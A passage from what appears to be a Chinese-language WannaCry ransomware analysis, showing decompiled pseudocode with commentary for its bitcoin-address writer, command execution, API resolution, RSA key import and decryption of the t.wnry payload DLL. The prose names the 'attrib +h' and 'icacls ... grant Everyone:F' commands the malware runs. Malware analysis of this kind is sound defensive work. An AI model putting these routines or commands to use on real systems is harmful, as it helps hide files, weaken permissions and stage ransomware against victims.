v1 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Dest<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>Source<span class="token punctuation">)</span><span class="token punctuation">[</span>v1 <span class="token operator">%</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 拷贝随机账户到目标内存  </span>

result <span class="token operator">=</span> <span class="token function">ReadOrWriteFileToMem</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>DstBuf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 写入c.wnry到内存  </span>

<span class="token punctuation">&#125;</span>  

<span class="token keyword">return</span> result<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>函数随机的将三个比特币账户中的一个写入c.wnry文件中</p>
<h3 id="5-2-5-ExeCmdCommand-命令行执行"><a href="#5-2-5-ExeCmdCommand-命令行执行" class="headerlink" title="5.2.5 ExeCmdCommand 命令行执行"></a>5.2.5 ExeCmdCommand 命令行执行</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">ExeCmdCommand</span><span class="token punctuation">(</span>LPSTR lpCommandLine<span class="token punctuation">,</span> DWORD dwMilliseconds<span class="token punctuation">,</span> LPDWORD lpExitCode<span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token keyword">struct</span> <span class="token class-name">_STARTUPINFOA</span> StartupInfo<span class="token punctuation">;</span> <span class="token comment">//该结构用于指定新进程的主窗口特性  </span>

<span class="token keyword">struct</span> <span class="token class-name">_PROCESS_INFORMATION</span> ProcessInformation<span class="token punctuation">;</span> <span class="token comment">// [esp+4Ch] [ebp-10h]  </span>



StartupInfo<span class="token punctuation">.</span>cb <span class="token operator">=</span> <span class="token number">68</span><span class="token punctuation">;</span>  

<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>StartupInfo<span class="token punctuation">.</span>lpReserved<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x40u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

ProcessInformation<span class="token punctuation">.</span>hProcess <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

ProcessInformation<span class="token punctuation">.</span>hThread <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

ProcessInformation<span class="token punctuation">.</span>dwProcessId <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

ProcessInformation<span class="token punctuation">.</span>dwThreadId <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

StartupInfo<span class="token punctuation">.</span>wShowWindow <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

StartupInfo<span class="token punctuation">.</span>dwFlags <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">CreateProcessA</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> lpCommandLine<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x8000000u</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>StartupInfo<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ProcessInformation<span class="token punctuation">)</span> <span class="token punctuation">)</span>  

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>         <span class="token comment">// 设置当前目录下的所有文件属性为隐藏 命令行参数错误 函数并未成功  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> dwMilliseconds <span class="token punctuation">)</span>                         <span class="token comment">// 条件不成立 跳转到关闭句柄处  </span>

<span class="token punctuation">&#123;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>ProcessInformation<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> dwMilliseconds<span class="token punctuation">)</span> <span class="token punctuation">)</span>  

<span class="token function">TerminateProcess</span><span class="token punctuation">(</span>ProcessInformation<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> <span class="token number">0xFFFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> lpExitCode <span class="token punctuation">)</span>  

<span class="token function">GetExitCodeProcess</span><span class="token punctuation">(</span>ProcessInformation<span class="token punctuation">.</span>hProcess<span class="token punctuation">,</span> lpExitCode<span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  

<span class="token function">CloseHandle</span><span class="token punctuation">(</span>ProcessInformation<span class="token punctuation">.</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token function">CloseHandle</span><span class="token punctuation">(</span>ProcessInformation<span class="token punctuation">.</span>hThread<span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在函数主题逻辑中利用到了两次ExeCmdCommand函数：</p>
<p>第一个创建了一个进程 并利用参数”attrib+h”<br>将当前目录下的所有文件设置为隐藏</p>
<p>第二个利用参数 “icacls ./grant Everyone:F /T /C /Q”添加用户并给予权限</p>
<h2 id="5-3-加载病毒核心操作"><a href="#5-3-加载病毒核心操作" class="headerlink" title="5.3 加载病毒核心操作"></a>5.3 加载病毒核心操作</h2><p>在这部分所涉及的函数的操作都只有一个目的，即利用dll文件中的导出函数，下面我们分步进行分析</p>
<h3 id="5-3-1-GetApis-获取必要的API函数"><a href="#5-3-1-GetApis-获取必要的API函数" class="headerlink" title="5.3.1 GetApis 获取必要的API函数"></a>5.3.1 GetApis 获取必要的API函数</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">GetApis</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

HMODULE KernelBase<span class="token punctuation">;</span> <span class="token comment">// eax  </span>

HMODULE KernelAddr<span class="token punctuation">;</span> <span class="token comment">// edi  </span>

FARPROC CloseHandle_Addr<span class="token punctuation">;</span> <span class="token comment">// eax  </span>

<span class="token keyword">signed</span> <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax  </span>



<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">GetCryptoAPIAddr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>                    <span class="token comment">// 获取CryptoAPI函数地址  </span>

<span class="token keyword">goto</span> LABEL_15<span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> CreateFileW_Addr <span class="token punctuation">)</span>  

<span class="token keyword">goto</span> LABEL_16<span class="token punctuation">;</span>  

KernelBase <span class="token operator">=</span> <span class="token function">LoadLibraryA</span><span class="token punctuation">(</span>Kernel32<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 加载Kernel32.dll的基址  </span>

KernelAddr <span class="token operator">=</span> KernelBase<span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>KernelBase <span class="token punctuation">)</span>  

<span class="token keyword">goto</span> LABEL_15<span class="token punctuation">;</span>  

CreateFileW_Addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>KernelBase<span class="token punctuation">,</span> CreateFileW<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 获取文件操作的API函数地址  </span>

WriteFile_Addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>KernelAddr<span class="token punctuation">,</span> WriteFile_0<span class="token punctuation">)</span><span class="token punctuation">;</span>  

ReadFile_Addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">BOOL</span> <span class="token punctuation">(</span>__stdcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>HANDLE<span class="token punctuation">,</span> LPVOID<span class="token punctuation">,</span> DWORD<span class="token punctuation">,</span> LPDWORD<span class="token punctuation">,</span> LPOVERLAPPED<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>  

KernelAddr<span class="token punctuation">,</span>  

ReadFile_0<span class="token punctuation">)</span><span class="token punctuation">;</span>  

MoveFileW_Addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>KernelAddr<span class="token punctuation">,</span> MoveFileW<span class="token punctuation">)</span><span class="token punctuation">;</span>  

MoveFileExW_Addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>KernelAddr<span class="token punctuation">,</span> MoveFileExW<span class="token punctuation">)</span><span class="token punctuation">;</span>  

DeleteFileW_Addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">GetProcAddress</span><span class="token punctuation">(</span>KernelAddr<span class="token punctuation">,</span> DeleteFileW<span class="token punctuation">)</span><span class="token punctuation">;</span>  

CloseHandle_Addr <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span>KernelAddr<span class="token punctuation">,</span> CloseHandle_0<span class="token punctuation">)</span><span class="token punctuation">;</span>  

Int_CloseHandle_Addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>CloseHandle_Addr<span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>CreateFileW_Addr <span class="token punctuation">)</span>  

<span class="token keyword">goto</span> LABEL_15<span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> WriteFile_Addr <span class="token operator">&amp;&amp;</span> ReadFile_Addr <span class="token operator">&amp;&amp;</span> MoveFileW_Addr <span class="token operator">&amp;&amp;</span> MoveFileExW_Addr <span class="token operator">&amp;&amp;</span> DeleteFileW_Addr <span class="token operator">&amp;&amp;</span> CloseHandle_Addr <span class="token punctuation">)</span>  

LABEL_16<span class="token operator">:</span>  

result <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  

<span class="token keyword">else</span>  

LABEL_15<span class="token operator">:</span>  

result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token keyword">return</span> result<span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>此函数的主要目的就是为后面的操作获取常用API函数的地址例如-CreateFileW。</p>
<h3 id="5-3-2-CDatabase-CDataBase-构造函数"><a href="#5-3-2-CDatabase-CDataBase-构造函数" class="headerlink" title="5.3.2 CDatabase::CDataBase 构造函数"></a>5.3.2 CDatabase::CDataBase 构造函数</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>__thiscall CDatabase<span class="token operator">::</span><span class="token function">CDatabase</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>this<span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token keyword">char</span> <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment">// esi  </span>



v1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>this<span class="token punctuation">;</span>  

<span class="token function">Crt_InitializeCriticalSection</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>this <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 初始化临界区对象  </span>

<span class="token function">Crt_InitializeCriticalSection</span><span class="token punctuation">(</span>v1 <span class="token operator">+</span> <span class="token number">44</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">return</span> v1<span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>初始化两个用于线程同步的临界区对象CDatabase</p>
<h3 id="5-3-3-ImportKeyAndAllocMem-导入密钥并申请空间"><a href="#5-3-3-ImportKeyAndAllocMem-导入密钥并申请空间" class="headerlink" title="5.3.3 ImportKeyAndAllocMem 导入密钥并申请空间"></a>5.3.3 ImportKeyAndAllocMem 导入密钥并申请空间</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __thiscall <span class="token function">ImportKeyAndAllocMem</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>this<span class="token punctuation">,</span> LPCSTR FileName<span class="token punctuation">,</span> <span class="token keyword">int</span> a3<span class="token punctuation">,</span> <span class="token keyword">int</span> a4<span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

_DWORD <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// esi  </span>

HGLOBAL hGlobal<span class="token punctuation">;</span> <span class="token comment">// eax  </span>

HGLOBAL hGlobal_2<span class="token punctuation">;</span> <span class="token comment">// eax  </span>



v4 <span class="token operator">=</span> this<span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">ImportPrivateKey</span><span class="token punctuation">(</span>this <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> FileName<span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token comment">// 导入私钥  </span>

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> FileName <span class="token punctuation">)</span>  

<span class="token function">ImportPrivateKey</span><span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

hGlobal <span class="token operator">=</span> <span class="token function">GlobalAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x100000u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 申请一块全局的固定内存块  </span>

v4<span class="token punctuation">[</span><span class="token number">306</span><span class="token punctuation">]</span> <span class="token operator">=</span> hGlobal<span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>hGlobal <span class="token punctuation">)</span>  

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  

hGlobal_2 <span class="token operator">=</span> <span class="token function">GlobalAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x100000u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

v4<span class="token punctuation">[</span><span class="token number">307</span><span class="token punctuation">]</span> <span class="token operator">=</span> hGlobal_2<span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>hGlobal_2 <span class="token punctuation">)</span>  

<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  

v4<span class="token punctuation">[</span><span class="token number">309</span><span class="token punctuation">]</span> <span class="token operator">=</span> a3<span class="token punctuation">;</span>  

v4<span class="token punctuation">[</span><span class="token number">308</span><span class="token punctuation">]</span> <span class="token operator">=</span> a4<span class="token punctuation">;</span>  

<span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个函数完成了两项工作：</p>
<ol>
<li><p> 导入 RSA 私钥，用来解密后面的相关文件</p>
</li>
<li><p> 申请了两块大小为 0x100000 的内存</p>
</li>
</ol>
<h3 id="5-3-4-DecryptFile-解密t-wnry"><a href="#5-3-4-DecryptFile-解密t-wnry" class="headerlink" title="5.3.4 DecryptFile 解密t.wnry"></a>5.3.4 DecryptFile 解密t.wnry</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __thiscall <span class="token function">DecryptFile</span><span class="token punctuation">(</span><span class="token keyword">void</span> this<span class="token punctuation">,</span> LPCSTR lpFileName<span class="token punctuation">,</span> <span class="token keyword">int</span> DecryptFileSize<span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

hFile <span class="token operator">=</span> <span class="token function">CreateFileA</span><span class="token punctuation">(</span>lpFileName<span class="token punctuation">,</span> GENERIC_READ<span class="token punctuation">,</span> FILE_SHARE_READ<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> OPEN_EXISTING<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 以只读的方式打开t.wnry  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> hFile <span class="token operator">!=</span> <span class="token punctuation">(</span>HANDLE<span class="token punctuation">)</span>INVALID_HANDLE_VALUE <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token function">GetFileSizeEx</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> <span class="token operator">&amp;</span>FileSize<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 获取文件大小  </span>

<span class="token keyword">if</span> <span class="token punctuation">(</span> FileSize<span class="token punctuation">.</span>QuadPart <span class="token operator">&lt;=</span> <span class="token number">0x6400000</span> <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">ReadFile_Addr</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> <span class="token operator">&amp;</span>lpBuffer<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>lpNumberOfBytesRead<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 读取8个字节的文件内容 读取的内容为WANACRY!  </span>

<span class="token punctuation">&#123;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">memcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lpBuffer<span class="token punctuation">,</span> aWanacry<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">ReadFile_Addr</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Buffer<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>lpNumberOfBytesRead<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 继续向后读取4个字节的内容 读取的内容为0x100  </span>

<span class="token punctuation">&#123;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> Buffer <span class="token operator">==</span> <span class="token number">0x100</span> <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">ReadFile_Addr</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> pBuffer<span class="token punctuation">[</span><span class="token number">306</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>lpNumberOfBytesRead<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 读取0x100个字节  </span>

<span class="token punctuation">&#123;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">ReadFile_Addr</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buff<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>lpNumberOfBytesRead<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 再次读取4个字节 内容为04  </span>

<span class="token punctuation">&#123;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">ReadFile_Addr</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buffer<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>lpNumberOfBytesRead<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 继续往后读8字节->10000  </span>

<span class="token punctuation">&#123;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> buffer <span class="token operator">&lt;=</span> <span class="token number">0x6400000</span> <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">DecryptData</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pBuffer <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>BYTE <span class="token operator">*</span><span class="token punctuation">)</span>pBuffer<span class="token punctuation">[</span><span class="token number">306</span><span class="token punctuation">]</span><span class="token punctuation">,</span> Buffer<span class="token punctuation">,</span> <span class="token operator">&amp;</span>DecryptDatas<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>DataSize<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 对读取的0x100个字节进行解密  </span>

<span class="token punctuation">&#123;</span>  

<span class="token function">sub_402A76</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>pBuffer <span class="token operator">+</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>DecryptDatas<span class="token punctuation">,</span> Src<span class="token punctuation">,</span> DataSize<span class="token punctuation">,</span> <span class="token number">0x10u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

hGlobal_3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">GlobalAlloc</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> hGlobal_3 <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

<span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">ReadFile_Addr</span><span class="token punctuation">(</span>hFile<span class="token punctuation">,</span> pBuffer<span class="token punctuation">[</span><span class="token number">306</span><span class="token punctuation">]</span><span class="token punctuation">,</span> FileSize<span class="token punctuation">.</span>LowPart<span class="token punctuation">,</span> <span class="token operator">&amp;</span>lpNumberOfBytesRead<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">// 读取0x10000个字节  </span>

<span class="token operator">&amp;&amp;</span> lpNumberOfBytesRead  

<span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>buffer <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token function">SHIDWORD</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> lpNumberOfBytesRead <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>buffer<span class="token punctuation">)</span> <span class="token punctuation">)</span>  

<span class="token punctuation">&#123;</span>  

pFileAddr <span class="token operator">=</span> hGlobal_3<span class="token punctuation">;</span>  

<span class="token function">DecryptPEFile</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pBuffer <span class="token operator">+</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pBuffer<span class="token punctuation">[</span><span class="token number">306</span><span class="token punctuation">]</span><span class="token punctuation">,</span> hGlobal_3<span class="token punctuation">,</span> lpNumberOfBytesRead<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将读取的内容解密成一个PE文件  </span>

<span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>DecryptFileSize <span class="token operator">=</span> buffer<span class="token punctuation">;</span>  

<span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  

<span class="token function">local_unwind2</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>ms_exc<span class="token punctuation">.</span>registration<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  

<span class="token keyword">return</span> pFileAddr<span class="token punctuation">;</span>                             <span class="token comment">// 返回解析出的文件首地址  </span>

<span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在函数执行过程中，我们一直对t.wnry文件执行读取操作，每读取一个片段到内存边利用已有的RSA私钥进行解密，返回解密后的文件内容。</p>
<img src="/2020/12/30/Wannacry%20%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image17.png" class="" width="17">

<p>图十五：OD查看函数返回值</p>
<p>查看解密后的文件，是一个PE文件，通过对文件源码和结构的分析，判断它是一个dll文件，且是先前资源包中的t_wnry.dll。</p>
